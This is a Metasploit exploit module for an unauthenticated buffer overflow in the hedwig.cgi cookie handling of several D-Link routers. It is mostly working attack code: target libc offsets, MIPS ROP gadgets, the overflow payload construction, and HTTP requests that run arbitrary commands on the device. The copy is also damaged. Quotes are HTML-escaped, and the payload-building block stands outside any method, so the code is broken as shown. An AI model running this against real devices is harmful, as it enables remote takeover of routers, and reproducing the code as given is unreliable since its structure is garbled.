# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerEcho
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;D-Link hedwig.cgi Buffer Overflow in Cookie Header&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an anonymous remote code execution vulnerability on several D-Link
        routers. The vulnerability exists in the handling of HTTP queries to the hedwig.cgi with
        long value cookies. This module has been tested successfully on D-Link DIR300v2.14, DIR600
        and the DIR645A1_FW103B11 firmware.
      },
      &#039;Author&#039;         =>
        [
          &#039;Roberto Paleari&#039;, # Vulnerability discovery
          &#039;Craig Heffner&#039;,   # also discovered the vulnerability / help with some parts of this exploit
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039;, # Metasploit module and verification on several other routers
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;95950&#039;],
          [&#039;EDB&#039;, &#039;27283&#039;],
          [&#039;URL&#039;, &#039;http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10008&#039;], #advisory on vendor web site
          [&#039;URL&#039;, &#039;http://www.dlink.com/us/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000&#039;], #vendor web site of router
          [&#039;URL&#039;, &#039;http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt&#039;]  #original advisory
        ],
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => ARCH_MIPSLE,
      &#039;Targets&#039;        =>
        [
          [ &#039;Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600&#039;,
            {
              &#039;Offset&#039;      => 973,
              &#039;LibcBase&#039;    => 0x2aaf8000,    # Router
              #&#039;LibcBase&#039;   => 0x40854000,    # QEMU environment
              &#039;System&#039;      => 0x000531FF,    # address of system
              &#039;CalcSystem&#039;  => 0x000158C8,    # calculate the correct address of system
              &#039;CallSystem&#039;  => 0x000159CC,    # call our system
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 08 2013&#039;,
      &#039;DefaultTarget&#039; => 0))
  end
 
  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => "/hedwig.cgi",
        &#039;method&#039;  => &#039;GET&#039;
      })
 
      if res && [200, 301, 302].include?(res.code) && res.body.to_s =~ /unsupported HTTP request/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
 
    Exploit::CheckCode::Unknown
  end
 
  def exploit
    print_status("#{peer} - Accessing the vulnerable URL...")
 
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end
 
    print_status("#{peer} - Exploiting...")
    execute_cmdstager(
      :linemax => 200,
      :concat_operator => " && "
    )
  end
 
    shellcode = rand_text_alpha_upper(target[&#039;Offset&#039;])                  # padding
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;System&#039;]].pack("V")       # s0 - address of system
    shellcode << rand_text_alpha_upper(16)                               # unused reg $s1 - $s4
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;CallSystem&#039;]].pack("V")   # s5 - second gadget (call system)
 
        # .text:000159CC 10 00 B5 27    addiu   $s5, $sp, 0x170+var_160  # get the address of our command into $s5
        # .text:000159D0 21 28 60 02    move    $a1, $s3                 # not used
        # .text:000159D4 21 30 20 02    move    $a2, $s1                 # not used
        # .text:000159D8 21 C8 00 02    move    $t9, $s0                 # $s0 - system
        # .text:000159DC 09 F8 20 03    jalr    $t9                      # call system
        # .text:000159E0 21 20 A0 02    move    $a0, $s5                 # our cmd -> into a0 as parameter for system
 
    shellcode << rand_text_alpha_upper(12)                               # unused registers $s6 - $fp
 
        # .text:000158C8 21 C8 A0 02    move    $t9, $s5                 # s5 - our second gadget
        # .text:000158CC 09 F8 20 03    jalr    $t9                      # jump the second gadget
        # .text:000158D0 01 00 10 26    addiu   $s0, 1                   # s0 our system address - lets calculate the right address
 
    shellcode << rand_text_alpha_upper(16)                               # filler in front of our command
    shellcode << cmd
  end
 
  def execute_command(cmd, opts)
 
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => "/hedwig.cgi",
        &#039;cookie&#039;   => "uid=#{shellcode}",
        &#039;encode_params&#039; => false,
        &#039;vars_post&#039; => {
          rand_text_alpha(4) => rand_text_alpha(4)
        }
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

